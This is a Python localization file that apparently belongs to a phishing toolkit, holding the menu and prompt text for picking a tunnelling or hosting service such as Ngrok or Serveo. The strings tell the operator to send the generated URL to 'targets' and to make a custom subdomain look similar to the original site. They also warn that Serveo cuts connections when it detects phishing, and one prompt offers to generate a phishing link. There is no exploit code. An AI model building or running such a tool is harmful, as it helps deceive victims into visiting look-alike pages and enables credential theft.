import Defs.ThemeManager.theme as theme
from Defs.LocalizationManager.localization import _

default_palette = theme.default_palette

lang_server_selection = {
    "server_selection" : _('{0}[ Hosting Server Selection ]{1}! {0}\n-------------------------------').format(default_palette[0], default_palette[2]),
    "select_any_available_server" : _('\n {0}[{1}*{0}]{0}Select Any Available Server:{1}').format(default_palette[0], default_palette[4]),
    "servers_list" :
    [ ['{0}[{1}00{0}]{1}Localhost', '{0}[{1}04{0}]{1}Localtunnel (not working for now)'],
      ['{0}[{1}01{0}]{1}Ngrok', '{0}[{1}05{0}]{1}OpenPort (not working for now)'],
      ['{0}[{1}02{0}]{1}Serveo', '{0}[{1}06{0}]{1}Pagekite (not working for now)'],
      ['{0}[{1}03{0}]{1}Localxpose (not working for now)']]
}

lang_start_localhost = {
    "localhost_server" : _('\n{0}[ Localhost Server ]{1}! {0}\n-------------------------------').format(default_palette[0], default_palette[2]),
    "your_localhost_is" : _('Your Localhost is '),
    "starting_server_on_addr" : _('\n[*] Starting Server On:: {0}:{1}'),
    "running_localhost_server" : _('\n{0}[ Running LocalHost Server ]{1}! {0}\n-------------------------------').format(default_palette[0], default_palette[2]),
    "send_this_url_suggestion" : _('\n{0}[{1}!{0}]{1} Send This Url To Targets On Same Network').format(default_palette[0], default_palette[2]),
    "localhost_url" : _('\n{0}[{1}*{0}]{1} Localhost Url: {2}http://').format(default_palette[2], default_palette[3], default_palette[3])
}

lang_start_ngrok = {
    "ngrok_server" : _('\n{0}[ Ngrok Server ]{1}! {0}\n-------------------------------').format(default_palette[0], default_palette[2]),
    "send_this_url_suggestion" : _("\n{0}[{1}!{0}]{1} Send This Url to targets").format(default_palette[0], default_palette[2]),
    "ngrok_url" : _('\n{0}[{1}*{0}]{1} Ngrok Url: {2}').format(default_palette[0], default_palette[2], default_palette[3])
}

lang_start_serveo = {
    "serveo_random_server" : _('\n{0}[ Random Serveo Url ]{1}! {0}\n-------------------------------').format(default_palette[0], default_palette[2]),
    "serveo_custom_server" : _('\n{0}[ Custom Serveo Url ]{1}! {0}\n-------------------------------').format(default_palette[0], default_palette[2]),
    "send_this_url_suggestion" : _('\n{0}[{1}!{0}]{1} Send This Serveo Url To Targets').format(default_palette[0], default_palette[4]),
    "make_url_simmilar_to_real_suggestion" : _('\n{0}[{1}!{0}]{1} You Can Make Your Url Similar To Original.').format(default_palette[0], default_palette[4]),
    "insert_custom_subdomain" : _('\n{0}Insert A Custom Subdomain For Serveo').format(default_palette[0], default_palette[2]),
    "serveo_url" : _('\n{0}[{1}*{0}]{1} Serveo Url: {2}').format(default_palette[0], default_palette[4], default_palette[3]),
    "failed_to_get_domain" : _('\n{0}Failed to get this domain.').format(default_palette[0]),
    "suggestion_to_fix_issue" : _('\n{0}Custom Url May Be Not Valid Or Already Occupied By Someone Else.').format(default_palette[0]),
    "you_can_try_to_select_other_domain" : _('\n{0}[{1}!{0}]Try To Select Another Custom Domain{1} (Going Back)...').format(default_palette[0], default_palette[4]),
    "serveo_url_option_selection" : _('\n{0}[ Serveo Url Type Selection ]{1}! {0}\n-------------------------------').format(default_palette[0], default_palette[2]),
    "serveo_phishing_warning" : _('\n{0}[{1}!{0}]{1}Serveo Drops The Connection Whenever Detects Phishing. Be careful.').format(default_palette[0], default_palette[2]),
    "choose_type_of_url" : _('\n{0}[{1}*{0}]{0}CHOOSE SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}').format(default_palette[0], default_palette[2]),
    "url_types" : 
    [ ['{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url)'],
      ['{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)'] ],
    "serveo_is_down" : _('{0}[{1}1{0}]Serveo is {1}Down{0} Now, Do You Want To Select Another Option? {1}Y{0}/{1}n{0}').format(default_palette[0], default_palette[2])
}
